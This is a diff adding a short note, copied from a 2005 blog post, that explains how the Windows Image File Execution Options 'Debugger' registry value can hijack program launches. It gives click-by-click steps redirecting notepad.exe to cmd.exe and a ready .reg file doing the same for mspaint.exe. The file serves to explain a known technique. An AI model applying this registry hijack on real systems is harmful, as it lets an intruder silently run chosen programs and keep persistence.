@@ -1,0 +1,20 @@
+Source:http://silverstr.ufies.org/blog/archives/000809.html 4/25/2005
+
+Using Image File Execution options as an Attack Vector on Windows
+
+1. Start the Registry Editor: Click Start, click Run, and then type regedt32.
+2. Locate the following registry key: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
+3. To this hive, add the SOURCE exe as a key. Lets use notepad.exe: (Right click and select New, and then Key (Add the key and name it notepad.exe)
+4. To the notepad.exe key, add a new REG_SZ (string) value called Debugger, and point it to c:\windows\system32\cmd.exe
+5. Start up notepad (Click Start, click Run, and then type notepad)
+6. Notice that a new cmd window opened instead
+
+
+
+Registry file sample
+
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mspaint.exe]
+"Debugger"="c:\\windows\\system32\\cmd.exe"
+
